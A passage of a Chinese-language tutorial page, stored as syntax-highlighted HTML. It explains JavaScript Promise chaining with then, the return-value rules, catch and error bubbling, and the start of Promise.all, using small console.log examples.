<code>Promise</code>实例添加状态改变时的回调函数。<code>then</code>方法的第一个参数是<code>resolved</code>状态的回调函数，第二个参数（可选）是<code>rejected</code>状态的回调函数。</p>\n</li>\n<li><p>链式操作<br><code>then</code>方法返回的是一个新的<code>promise</code>，因此可以采用链式写法，即<code>then</code>方法后面再调用另一个<code>then</code>方法。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">result</span> <span class=\"token operator\">=></span> console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">//1</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">result</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>              <span class=\"token comment\">//undefined</span>\n        <span class=\"token keyword\">return</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">result</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>             <span class=\"token comment\">//2</span>\n        <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"err\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">result</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span><span class=\"token punctuation\">&#123;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>            \n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">err</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span><span class=\"token punctuation\">&#123;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>                <span class=\"token comment\">//Error: err</span>\n        <span class=\"token keyword\">return</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">result</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>            <span class=\"token comment\">//3</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>注意：①不管是<code>then</code>方法的<code>onfulfilled</code>函数参数执行还是<code>onrejected</code>（可选参数）函数参数执行，<code>then</code>方法返回的都是一个新的<code>Promise</code>对象，都可以继续采用链式写法调用另一个<code>then</code>方法。②<code>Promise.prototype.catch()</code>方法返回的也是一个<code>Promise</code>对象。<code>then</code>方法和<code>catch</code>方法可以链式操作。</p>\n</li>\n<li><p>返回值<br><code>then</code>方法返回一个<code>Promise</code>，而它的行为与<code>then</code>中的被调用的回调函数(<code>onfulfilled</code>函数&#x2F;<code>onrejected</code>函数)的返回值有关。<br>(1) 如果<code>then</code>中的回调函数返回一个值，那么<code>then</code>返回的<code>Promise</code>将会成为接受状态，并且将返回的值作为接受状态的回调函数的参数值。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">reject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token number\">99</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token number\">42</span> <span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span> <span class=\"token parameter\">result</span> <span class=\"token operator\">=></span> console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 42</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>(2) 如果<code>then</code>中的回调函数抛出一个错误，那么<code>then</code>返回的<code>Promise</code>将会成为拒绝状态，并且将抛出的错误作为拒绝状态的回调函数的参数值。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">'err'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">err</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//Error: err</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>(3) 如果<code>then</code>中的回调函数返回一个已经是接受状态的<code>Promise</code>，那么<code>then</code>返回的<code>Promise</code>也会成为接受状态，并且将那个<code>Promise</code>的接受状态的回调函数的参数值作为该被返回的<code>Promise</code>的接受状态回调函数的参数值。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve</span> <span class=\"token operator\">=></span> <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ok'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">result</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//ok</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>(4) 如果<code>then</code>中的回调函数返回一个已经是拒绝状态的<code>Promise</code>，那么<code>then</code>返回的<code>Promise</code>也会成为拒绝状态，并且将那个<code>Promise</code>的拒绝状态的回调函数的参数值作为该被返回的<code>Promise</code>的拒绝状态回调函数的参数值。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n           <span class=\"token function\">reject</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">'err'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">err</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//Error: err</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>(5) 如果<code>then</code>中的回调函数返回一个未定状态（<code>pending</code>）的<code>Promise</code>，那么<code>then</code>返回<code>Promise</code>的状态也是未定的，并且它的终态与那个<code>Promise</code>的终态相同；同时，它变为终态时调用的回调函数参数与那个<code>Promise</code>变为终态时的回调函数的参数是相同的。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span>resolve<span class=\"token punctuation\">,</span> <span class=\"token number\">2000</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'ok'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">result</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//ok</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>注意：这里是<code>then</code>方法中被调用回调函数的返回值与<code>then</code>方法返回的<code>Promise</code>对象状态之间的关系。</p>\n</li>\n</ol>\n<p><strong>Promise.prototype.catch(onRejected)</strong></p>\n<ol>\n<li><p>语法</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\">p<span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span>onRejected<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\np<span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">reason</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// 拒绝</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>含义<br><code>Promise.prototype.catch</code>方法是<code>.then(null, rejection)</code>的别名，用于指定发生错误时的回调函数，返回一个新的<code>promise</code>对象。</p>\n</li>\n<li><p>用法</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span>reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">reject</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">'err'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//reject方法的作用，等同于抛出错误</span>\n    <span class=\"token comment\">//throw new Error('err');</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\np<span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">err</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//Err: err</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">//--------等价写法---------</span>\np<span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">err</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//Err: err</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>注意：由于<code>.catch</code>方法是<code>.then(null, rejection)</code>的别名，故<code>.then</code>中的链式操作(3)、返回值(4)等语法在<code>.catch</code>中都适用。</p>\n</li>\n<li><p>一般总是建议，<code>Promise</code> 对象后面要跟<code>catch</code>方法，这样可以处理 <code>Promise</code>内部发生的错误。<code>catch</code>方法返回的还是一个 <code>Promise</code> 对象，因此后面还可以接着调用<code>then</code>方法。</p>\n</li>\n<li><p><code>Promise</code>对象的错误具有“冒泡”性质，会一直向后传递，直到被捕获为止。也就是说，错误总是会被下一个<code>catch</code>语句捕获。 即：当前<code>catch</code>方法可以捕获上一个<code>catch</code>方法(包括上一个<code>catch</code>)到当前<code>catch</code>(不包括当前<code>catch</code>)方法之间所有的错误，如果没有错误，则当前<code>catch</code>方法不执行。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">new Promise(() &#x3D;&gt; &#123;\n    throw new Error(&#39;err1&#39;);\n&#125;)\n    .then(() &#x3D;&gt; &#123;console.log(1);&#125;)\n    .then(() &#x3D;&gt; &#123;console.log(2);&#125;)\n    .catch((err) &#x3D;&gt; &#123;\n        console.log(err); &#x2F;&#x2F;Err: err1\n        throw  new Error(&#39;err2&#39;);\n    &#125;)\n    .catch((err) &#x3D;&gt; &#123;console.log(err);&#125;)&#x2F;&#x2F;Err: err2<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>一般来说，不要在<code>then</code>方法里面定义<code>Reject</code>状态的回调函数（即<code>then</code>的第二个参数），总是使用<code>catch</code>方法。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token comment\">// bad</span>\n<span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span><span class=\"token comment\">/* success */</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">err</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span><span class=\"token comment\">/* error */</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// good</span>\n<span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">/* success */</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">err</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span><span class=\"token comment\">/* error */</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>上面代码中，第二种写法要好于第一种写法，理由是第二种写法可以捕获前面<code>then</code>方法执行中的错误，也更接近同步的写法。</p>\n</li>\n<li><p>与传统的<code>try/catch</code>代码块不同的是，即使没有使用<code>catch</code>方法指定错误处理的回调函数，<code>Promise</code> 对象抛出的错误也不会中止外部脚本运行。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// 下面一行会报错，因为x没有声明</span>\n    <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ok'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'over'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//Uncaught (in promise) ReferenceError: x is not defined</span>\n<span class=\"token comment\">//over</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>在异步函数中抛出的错误不会被<code>catch</code>捕获到</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">new Promise((resolve, reject) &#x3D;&gt; &#123;\n    setTimeout(() &#x3D;&gt; &#123;\n        throw &#39;Uncaught Exception!&#39;;\n    &#125;, 1000);\n&#125;).catch(() &#x3D;&gt; &#123;\n    console.log(&#39;err&#39;); &#x2F;&#x2F;不会执行\n&#125;);\n\nnew Promise((resolve, reject) &#x3D;&gt; &#123;\n    setTimeout(() &#x3D;&gt; &#123;\n        reject();\n    &#125;, 1000);\n&#125;).catch(() &#x3D;&gt; &#123;\n    console.log(&#39;err&#39;); &#x2F;&#x2F;err\n&#125;);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>在<code>resolve()</code>后面抛出的错误会被忽略</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">throw</span> <span class=\"token string\">'Silenced Exception!'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 不会执行</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ol>\n<p><strong>Promise.all(iterable)</strong></p>\n<ol>\n<li><p>语法<br><code>var p = Promise.all([p1, p2, p3]);</code></p>\n</li>\n<li><p>含义<br><code>Promise.all</code>方法接受一个数组作为参数，<code>p1</code>、<code>p2</code>、<code>p3</code>都是 <code>Promise</code> 实例，如果不是，就会先调用下面讲到的<code>Promise.resolve</code>方法，将参数转为 <code>Promise</code> 实例，再进一步处理。（<code>Promise.all</code>方法的参数可以不是数组，但必须具有 <code>Iterator</code> 接口，且返回的每个成员都是 <code>Promise</code> 实例。）<br><code>p</code>的状态由<code>p1</code>、<code>p2</code>、<code>p3</code>决定，分成两种情况。<br>(1) 只有<code>p1</code>、<code>p2</code>、<code>p3</code>的状态都变成<code>fulfilled</code>，<code>p</code>的状态才会变成<code>fulfilled</code>，此时<code>p1</code>、<code>p2</code>、<code>p3</code>的返回值组成一个数组，传递给<code>p</code>的回调函数。<br>(2) 只要<code>p1</code>、<code>p2</code>、<code>p3</code>之中有一个被<code>rejected</code>，<code>p</code>的状态就变成<code>rejected</code>，此时第一个被<code>reject</code>的实例的返回值，会传递给<code>p</code>的回调函数。</p>\n</li>\n<li><p>用法</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> p1 <span class=\"token operator\">=</span> <span class=\"token string\">'p1-ok'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> p2 <span class=\"token operator\">=</span> Promise<span class=\"token punctuation\">.</span><span class=\"token function\">resolve</span><span 